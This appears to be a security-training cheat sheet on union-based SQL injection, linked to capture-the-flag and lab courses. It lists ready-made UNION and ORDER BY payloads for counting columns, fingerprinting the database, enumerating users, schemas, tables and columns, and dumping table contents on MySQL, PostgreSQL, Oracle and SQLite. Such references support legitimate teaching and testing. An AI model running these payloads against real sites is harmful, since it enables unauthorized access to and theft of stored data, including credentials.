# Union-based SQLi

[![sqlinjectionfundamentals](../../../../../_badges/htb/sqlinjectionfundamentals.svg)](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
[![sqlinjectionlm](../../../../../_badges/thm/sqlinjectionlm.svg)](https://tryhackme.com/room/sqlinjectionlm)
[![sqlilab](../../../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)
[![marketplace](../../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)
[![sql_injection_string](../../../../../_badges/rootme/web_server/sql_injection_string.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)
[![sql_injection_numeric](../../../../../_badges/rootme/web_server/sql_injection_numeric.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)
[![sqli_oracle_version](../../../../../_badges/ps-lab/sqli_oracle_version.svg)](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
[![sqli_oracle_dump](../../../../../_badges/ps-lab/sqli_oracle_dump.svg)](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
[![sqli_mysql_version](../../../../../_badges/ps-lab/sqli_mysql_version.svg)](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
[![sqli_union_column_count](../../../../../_badges/ps-lab/sqli_union_column_count.svg)](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
[![sqli_union_column_type](../../../../../_badges/ps-lab/sqli_union_column_type.svg)](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
[![sqli_union_column_dump](../../../../../_badges/ps-lab/sqli_union_column_dump.svg)](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
[![sqli_union_column_concat](../../../../../_badges/ps-lab/sqli_union_column_concat.svg)](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
[![sqli_xml_bypass](../../../../../_badges/ps-lab/sqli_xml_bypass.svg)](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

<div class="row row-cols-lg-2"><div>

Union-based refer to using the UNION clause in the injected SQL to concatenate illegally fetched records to the usual results.

For instance, given a request returning the list of products, we could append to it the list of users and their passwords.

üôå When injecting an union payloads, you usually only want to see the union results. Simply use a search query with no results.
</div><div>

‚ö†Ô∏è It can only be achieved both queries have the **same number of attributes+type** in the SELECT <small>(as per the property of the UNION clause)</small>.

```sql!
SELECT 1 UNION SELECT 1;          -- ok
SELECT 1, 2 UNION SELECT 1;       -- not ok
SELECT 1, 2 UNION SELECT 1, "2";  -- not ok (on a table)
SELECT 1, 2 UNION SELECT 1, NULL; -- ok
```
</div></div>

<hr class="sep-both">

## Manual Union-based SQLi

[![sqlinjectionfundamentals](../../../../../_badges/htb/sqlinjectionfundamentals.svg)](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
[![sqlinjectionlm](../../../../../_badges/thm/sqlinjectionlm.svg)](https://tryhackme.com/room/sqlinjectionlm)
[![sqlilab](../../../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)

<div class="row row-cols-lg-2"><div>

#### Number of columns selected

The first step is to find how many columns there are in the SELECT. There are two popular ways, using `UNION` or `ORDER BY`.

Even if SQL errors are not displayed, if the results is "unexpected" <small>(ex: no results)</small>, we know that the request failed.

<details class="details-n">
<summary>Method 1: <code>UNION SELECT</code></summary>

```sql!
UNION SELECT NULL -- fail
UNION SELECT NULL, NULL -- fail
UNION SELECT NULL, NULL, NULL -- fail
UNION SELECT NULL, NULL, NULL, NULL -- OK
```
</details>

<details class="details-n">
<summary>Method 2: <code>ORDER BY</code></summary>

`ORDER BY` can take a number representing the $nth$ argument in the select. If you use an invalid $n$, then the request fails.

```sql!
ORDER BY 1 -- fail
ORDER BY 2 -- fail
ORDER BY 3 -- fail
ORDER BY 4 -- OK
```
</details>

In the example, we have 4 parameters.

<br>

#### Find the type of each column

The UNION will fails if a column in the first select has a different type in the second select. You should check the type of each column, by using `UNION SELECT` with value others than NULL.

```sql!
UNION SELECT 1, NULL, NULL, NULL -- KO
UNION SELECT "1", NULL, NULL, NULL -- OK
UNION SELECT "1", "1", NULL, NULL -- OK
...
```

<br>

#### Find which columns are displayed

Simply replace every `NULL` with a value, such as increasing numbers. If a value is not displayed, then skip it and work on other attributes.
</div><div>

#### Find the DBMS used

The second objective is to find the DBMS, and its version, just to ensure that any following query is valid in the DBMS language.

```sql!
UNION SELECT @@version, NULL, NULL, NULL
UNION SELECT sqlite_version(), NULL, NULL, NULL
UNION SELECT VERSION(), NULL, NULL, NULL
UNION SELECT (SELECT banner FROM v$version), NULL, NULL, NULL
-- see also: DMBS-specific functions, etc.
...
```

üëâ You can fetch the user too with `user()` or enumerate users:

```sql!
UNION SELECT group_concat(user), NULL, NULL, NULL from mysql.user
```

<br>

#### Extract data

To extract data, you need to find the **database**, the **table**, and the **columns**. It's an extensive operation.

<details class="details-n">
<summary>MariaDB/MySQL/PostgreSQL</summary>

```sql!
-- list databases, mostly unused as we use the current database
UNION SELECT SCHEMA_NAME, NULL, NULL, NULL FROM INFORMATION_SCHEMA.SCHEMATA
-- current database
UNION SELECT database(), NULL, NULL, NULL
-- table given 'database'
UNION SELECT group_concat(table_name), NULL, NULL, NULL FROM information_schema.tables WHERE TABLE_SCHEMA='database_name'
-- columns given 'table' and 'database'
UNION SELECT group_concat(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE TABLE_SCHEMA='database_name' AND TABLE_NAME='table_name'
-- dump
UNION SELECT group_concat(col1,":",col2 SEPARATOR '<br>'), NULL, NULL, NULL FROM database_name.table_name
UNION SELECT concat(col1,":",col2), NULL, NULL, NULL FROM database_name.table_name
UNION SELECT col1||":"||col2, NULL, NULL, NULL FROM database_name.table_name
```
</details>

<details class="details-n">
<summary>Oracle</summary>

You can use:

```sql!
union select table_name FROM all_tables
union select column_name FROM all_tab_columns where table_name='a_table'
```
</details>

<details class="details-n">
<summary>SQLite</summary>

```sql!
-- table
UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
-- columns given table
UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='<a table>'
-- dump
UNION SELECT group_concat(col1 || ":" || col2, '<br>'), NULL, NULL, NULL FROM table_name
```
</details>
</div></div>